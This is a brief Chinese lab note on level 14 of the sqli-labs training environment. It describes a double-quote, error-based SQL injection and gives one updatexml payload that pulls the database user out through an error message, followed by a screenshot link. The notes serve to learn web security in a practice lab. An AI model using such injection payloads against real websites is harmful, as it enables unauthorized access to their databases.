title: sql-labs 14关

less-14——基于"的错误回显注入

注入语句：admin" union select updatexml(1,concat(0x7e,(select user()),0x7e),1) --+

![image-20220330102535132](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20220330102535132.png)